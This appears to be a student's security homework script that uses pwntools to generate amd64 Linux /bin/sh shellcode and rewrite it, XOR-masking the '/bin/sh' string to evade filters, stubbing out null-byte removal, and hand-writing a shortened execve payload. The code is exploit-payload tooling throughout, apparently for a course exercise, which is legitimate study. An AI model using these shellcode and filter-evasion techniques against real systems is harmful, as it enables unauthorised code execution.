from pwnlib import shellcraft

newline = "\n"

################################################################
# This just returns the original shellcraft shellcode
################################################################
def sh():
    return shellcraft.amd64.linux.sh()

################################################################
# This extracts the /bin/sh string, xor's it with an arbitrary
# value. This value which doesn't contain /bin/sh is used to
# construct new equivalent instruction to replace the instruction
# that contained the /bin/sh string in the first place
# TODO: try to replace python string parcing with an advanced version
# of string parsing and replace hard coded string aspects
################################################################
def nobinsh():

    mixer = "0x0202020202020202"
    space = "    "
    i = 0
    raw = shellcraft.amd64.linux.sh()
    #print("length of shell: ", len(raw))
    comment_line = raw[:-219]
    binsh_line = raw[50:-173]
    #print("binsh line 2: ",binsh_line)
    binsh = binsh_line[9:]
    lenofbinsh = len(binsh)
    lines = binsh.splitlines()
    for line in lines:
        # print("line test: \n",line)
        tokens = line.split()
        # print("TEST1: \n", tokens)
        for word in tokens:
            if word == "0x732f2f2f6e69622f":
                # print("True")
                # print("token: \n", tokens)
                test_token = tokens
                # print("token position: \n", test_token[2])
                new_word = str(hex((int(word, 16) ^  int(mixer,16))))
                # print("test value: ", new_word)
                new_token = [words.replace(word,new_word) for words in tokens]
                # print("previous token: \n", tokens)
                # print("new token: \n", new_token)
                strings = " "
                binsh3 = strings.join(new_token)
                # print("binsh3: \n", binsh3)

            # print("TEST2: \n", word)

    # print("TEST: \n", lines)
    binsh2 = binsh[56:75]
    #print("TEST: ", test)
    #print("length of binsh", len(binsh))
    #print("binsh line: ",binsh)
    #binsh = str(hex((int(binsh, 16) ^  int(mixer,16))))
    binsh = str(hex((int(binsh2, 16) ^  int(mixer,16))))
    print("binsh value: ",binsh)

    mangled_binsh = newline + space + binsh3 + newline
    mangled_binsh += space + "mov r9, " + mixer + newline
    mangled_binsh += space + "xor rax, r9"

    # print("mangled_binsh: \n", mangled_binsh)
    # print("TEST: \n",raw[0:101])
    # print("TEST2: \n", raw[133:] )
    # print("TEST3: \n", raw[0:101] + mangled_binsh + raw[133:])
    # raw = raw.replace(binsh_line, mangled_binsh)
    raw = raw[0:101] + mangled_binsh + raw[133:]
    print("new raw: \n",raw)
    # print("new raw value: ", raw)
    return raw

################################################################
# TODO: This removes all null values in the shell code. This is a
# tough problem and more time is needed for a strategy. Usually
# instruction swith constant operands are the source of nulls,
# figuring out how to replace these instructions is non-trivial.
################################################################
def nonull(src):
    index = 0
    instr = " "
    operand = " "
    hasmov = False
    haspush = False
    hasrsp = False
    haspop = False

    lines = src.splitlines()
    #print(lines)

    for line in lines:
        tokens = line.split()
        for word in tokens:
            if ("0x" in word ) or  word.isnumeric() or ("rsp" in word) or ("pop" in word):
                if "mov" in line:
                    #print("move instruction")
                    #print(line)
                    hasmov = True
                if "push" in line:
                    #print("push instruction")
                    #print(line)
                    haspush = True
                if "rsp" in line:
                    #print("rsp as operand instruction")
                    #print(line)
                    hasrsp = True
                if "pop" in line:
                    #print("pop instruction")
                    #print(line)
                    haspop = True

    dest = src
    return dest

################################################################
# TODO: This attempts to shrink the shellcode to at most length
# len bytes. For Some reason we need to use rbx instead of rax which
# allows for it to work on the test of homework2 task07 but not sure why
# need to do further research on this
# reference for shortest shellcode available:
# https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html
################################################################
def compact():
    space = "    "
    raw = shellcraft.amd64.linux.sh()
    # print("TEST4: \n", raw[102:146])
    # original_code = raw[102:146]
    original_code = space + "mov rbx, 0x68732f2f6e69622f" + newline
    original_code += space + "push rbx" + newline
    shorten_code = newline + space + "xor esi, esi" + newline
    shorten_code += space + "push rsi" + newline
    shorten_code += original_code
    shorten_code += space + "push rsp" + newline
    shorten_code += space + "pop rdi" + newline
    shorten_code += space + "imul esi" + newline
    shorten_code += space + "mov al, 0x3b" + newline
    shorten_code += space + "syscall" + newline
    #return shellcraft.amd64.linux.sh()
    return shorten_code


################################################################
# TODO: try to replace python string parcing with an advanced version
# of string parsing and replace hard coded string aspects
################################################################

def combined(shellcode):
    mixer = "0x0202020202020202"
    space = "    "
    space1 = "   "
    i = 0
    print("shellcode info2: \n",shellcode)
    print("shellcode info: \n", shellcode[32:])
    print("shellcode info1: \n", shellcode[32:67])
    raw = shellcraft.amd64.linux.sh()
    #print("length of shell: ", len(raw))
    comment_line = raw[:-219]
    binsh_line = raw[50:-173]
    #print("binsh line 2: ",binsh_line)
    binsh = binsh_line[9:]
    lenofbinsh = len(binsh)
    lines = shellcode.splitlines()
    for line in lines:
        # print("line test: \n",line)
        tokens = line.split()
        # print("TEST1: \n", tokens)
        for word in tokens:
            if word == "0x732f2f2f6e69622f" or word == "0x68732f2f6e69622f":
                # print("True")
                # print("token: \n", tokens)
                test_token = tokens
                # print("token position: \n", test_token[2])
                new_word = str(hex((int(word, 16) ^  int(mixer,16))))
                # print("test value: ", new_word)
                new_token = [words.replace(word,new_word) for words in tokens]
                # print("previous token: \n", tokens)
                # print("new token: \n", new_token)
                strings = " "
                binsh3 = strings.join(new_token)
                # print("binsh3: \n", binsh3)
                register = tokens[1]
                # print("register of interest:",register)
                # print("binsh3: \n", binsh3)

            # print("TEST2: \n", word)

    # print("TEST: \n", lines)
    binsh2 = binsh[56:75]
    #print("TEST: ", test)
    #print("length of binsh", len(binsh))
    #print("binsh line: ",binsh)
    #binsh = str(hex((int(binsh, 16) ^  int(mixer,16))))
    binsh = str(hex((int(binsh2, 16) ^  int(mixer,16))))
    # print("binsh value: ",binsh)
    mangled_binsh = space1 + binsh3 + newline
    mangled_binsh += space + "mov r9, " + mixer + newline
    mangled_binsh += space + "xor " +register+" r9" + newline + space
    # print("mangled_binsh: \n",mangled_binsh)
    # print("mangled_binsh: \n", mangled_binsh)
    # print("TEST: \n",raw[0:101])
    # print("TEST2: \n", raw[133:] )
    # print("TEST3: \n", raw[0:101] + mangled_binsh + raw[133:])
    # raw = raw.replace(binsh_line, mangled_binsh)
    raw = shellcode[0:32] + mangled_binsh + shellcode[67:]
    # print("new raw: \n",raw)
    # print("new raw value: ", raw)
    return raw
